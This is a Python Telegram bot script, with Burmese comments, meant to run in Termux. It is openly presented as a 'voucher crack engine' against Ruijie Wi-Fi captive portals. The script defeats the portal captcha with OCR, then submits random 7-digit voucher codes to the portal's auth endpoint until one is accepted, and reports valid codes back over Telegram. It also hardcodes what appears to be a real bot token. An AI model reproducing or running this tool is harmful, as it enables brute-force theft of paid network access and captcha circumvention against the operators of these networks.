print("===== PHONE TERMUX BOT.PY LOADING =====", flush=True)
import os
import json
import asyncio
import concurrent.futures
from urllib.parse import urlparse, parse_qs
from telebot.async_telebot import AsyncTeleBot
from telebot.types import Message, Update, InlineKeyboardMarkup, InlineKeyboardButton
import aiohttp
import ddddocr
import random
import string
import time

# ===== Bot Token Configuration =====
BOT_TOKEN = "8851853713:AAE_x4jtZpza4owQ2Bm4d0quQ2BpJ8EWIJk"

bot = AsyncTeleBot(BOT_TOKEN)
user_settings = {}

# ddddocr ကို ဖုန်းထဲတွင် အဆင်သင့် သုံးနိုင်အောင် လုပ်ဆောင်ခြင်း
print("[SYSTEM] Initializing ddddocr Engine...", flush=True)
ocr = ddddocr.DdddOcr(show_ad=False)
executor = concurrent.futures.ThreadPoolExecutor(max_workers=2) # ဖုန်းအတွက် worker ၂ ခုပဲ ထားပါမယ်

# ===== URL Parser =====
def parse_ruijie_url(portal_url):
    parsed_url = urlparse(portal_url)
    base_api = f"{parsed_url.scheme}://{parsed_url.netloc}"
    params = parse_qs(parsed_url.query)
    
    return {
        "base_api": base_api,
        "mac": params.get("mac", params.get("sta_mac", [""])),
        "ip": params.get("ip", params.get("userip", [""])),
        "ssid": params.get("ssid", ["WiFi"]),
        "gw_id": params.get("gw_id", [""]),
        "gw_sn": params.get("gw_sn", [""]),
        "chap_id": params.get("chap_id", [""]),
        "chap_challenge": params.get("chap_challenge", [""]),
        "nasip": params.get("nasip", [""]),
        "slot_num": params.get("slot_num", [""])
    }

def sync_ocr_process(image_bytes):
    return ocr.classification(image_bytes)

# ===== Captcha ဖြေရှင်းပေးမည့် Real Logic =====
async def solve_captcha_via_ddddocr(session, base_api):
    try:
        captcha_url = f"{base_api}/api/auth/captcha?_ts={int(time.time()*1000)}"
        async with session.get(captcha_url, timeout=5) as resp:
            if resp.status == 200:
                img_bytes = await resp.read()
                # ဖုန်း Processor ဟန်းမသွားစေရန် ThreadPoolExecutor ဖြင့် ခွဲမောင်းခြင်း
                loop = asyncio.get_running_loop()
                captcha_text = await loop.run_in_executor(executor, sync_ocr_process, img_bytes)
                print(f"[CAPTCHA SOLVED] Result: {captcha_text}", flush=True)
                return captcha_text
    except Exception as e:
        print(f"Captcha OCR Error: {e}", flush=True)
    return ""

# ===== Core Voucher Crack Engine =====
async def crack_ruijie_voucher(session, settings, voucher_code):
    try:
        url_info = settings["url_info"]
        base_api = url_info["base_api"]
        
        # ၁။ ddddocr ဖြင့် Captcha အမှန်တကယ် ဖြေရှင်းခြင်း
        captcha_text = await solve_captcha_via_ddddocr(session, base_api)
        
        # ၂။ Payload တည်ဆောက်ခြင်း
        payload = {
            "auth_type": "voucher",
            "voucher": voucher_code,
            "captcha": captcha_text,
            "mac": url_info["mac"],
            "ip": url_info["ip"],
            "ssid": url_info["ssid"],
            "gw_id": url_info["gw_id"],
            "gw_sn": url_info["gw_sn"],
            "chap_id": url_info["chap_id"],
            "chap_challenge": url_info["chap_challenge"],
            "nasip": url_info["nasip"],
            "slot_num": url_info["slot_num"]
        }
        
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        }
        
        # အတိုင်ပင်ခံ ညွှန်ကြားထားသည့် သတ်မှတ်ချက်အတိုင်း Slash ပါသော နေရာသို့ ပို့ခြင်း
        api_path = settings.get("api_path", "/api/auth/voucher/")
        target_url = f"{base_api}{api_path}"
        
        async with session.post(target_url, data=payload, headers=headers, timeout=6) as response:
            res_text = await response.text()
            success_keyword = settings.get("success_keyword", '"errorCode":0')
            
            if success_keyword in res_text or '"code":0' in res_text:
                return {"status": "success", "code": voucher_code, "raw": res_text}
            else:
                return {"status": "fail", "raw": res_text}
                
    except Exception as e:
        return {"status": "error", "reason": str(e)}

# ===== Telegram Bot Handlers =====
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "📱 **Ruijie Termux Phone Bot Ready**\n\nစတင်ရန် `/setup` ဟု ရိုက်ပါ။")

@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    chat_id = message.chat.id
    user_settings[chat_id] = {
        "api_path": "/api/auth/voucher/",
        "success_keyword": '"errorCode":0',
        "prefix": ""
    }
    await bot.reply_to(
        message,
        "🛠️ **Phone Termux Settings Config**\n\n"
        "👉 `/set_pattern [Prefix]` (တကယ့် Voucher Pattern သတ်မှတ်ရန်)\n\n"
        "ပြင်ဆင်ပြီးပါက URL အား ထည့်သွင်းပါ:\n`/portal [your_url]`"
    )

@bot.message_handler(commands=['set_pattern'])
async def set_pattern(message):
    chat_id = message.chat.id
    args = message.text.split(maxsplit=1)
    if len(args) == 2 and chat_id in user_settings:
        user_settings[chat_id]["prefix"] = args
        await bot.reply_to(message, f"✅ Target Pattern Prefix: `{args}`")

@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    chat_id = message.chat.id
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return
    
    try:
        url_info = parse_ruijie_url(args)
        user_settings[chat_id]["url_info"] = url_info
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⚡ Phone Engine ဖြင့် စတင်မောင်းမည်", callback_data="start_scan"))
        
        await bot.reply_to(
            message,
            f"🔗 **Portal Meta Loaded**\n"
            f"📡 SSID: {url_info['ssid']}\n"
            f"🤖 Captcha Mode: ddddocr (Active in Phone)\n\n"
            f"စတင်စမ်းသပ်ရန် အောက်က ခလုတ်ကို နှိပ်ပါ။",
            reply_markup=markup
        )
    except Exception as e:
        await bot.reply_to(message, f"❌ URL Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data == "start_scan")
async def start_scan_callback(call):
    chat_id = call.message.chat.id
    settings = user_settings.get(chat_id)
    if not settings: return

    await bot.send_message(chat_id, "🚀 ဖုန်းထဲကနေ Multi-threading စနစ်နဲ့ စတင်စမ်းသပ်နေပါပြီ...")
    asyncio.create_task(run_voucher_scanner(chat_id, settings))

async def run_voucher_scanner(chat_id, settings):
    prefix = settings.get("prefix", "")
    remain_len = max(0, 7 - len(prefix))
    vouchers = []
    
    for _ in range(30):
        rand_part = ''.join(random.choices(string.digits, k=remain_len))
        vouchers.append(f"{prefix}{rand_part}")
        
    connector = aiohttp.TCPConnector(limit=3, ssl=False) # ဖုန်းဖြစ်လို့ ဆာဗာမကျအောင် လျှော့ထားပါတယ်
    async with aiohttp.ClientSession(connector=connector) as session:
        semaphore = asyncio.Semaphore(1) # ဖုန်း RAM ကို သက်သာစေရန် တစ်ကြိမ်လျှင် တစ်ခုစီ တိတိကျကျ စစ်ပါမည်
        
        async def worker(v_code):
            async with semaphore:
                res = await crack_ruijie_voucher(session, settings, v_code)
                if res["status"] == "success":
                    await bot.send_message(chat_id, f"🎉 **VALID VOUCHER FOUND!!**\n🔑 CODE: `{v_code}`")
                
        tasks = [worker(code) for code in vouchers]
        await asyncio.gather(*tasks)
        
    await bot.send_message(chat_id, "🏁 ဖုန်းတွင်း Automation စမ်းသပ်မှု အားလုံး ပြီးဆုံးပါပြီ။")

# ===== Long Polling စနစ်ဖြင့် Bot အား အမြဲရှင်သန်စေခြင်း =====
async def main():
    print("🤖 Telegram Bot Polling Started Inside Termux...", flush=True)
    await bot.infinity_polling(skip_pending=True)

if __name__ == '__main__':
    asyncio.run(main())
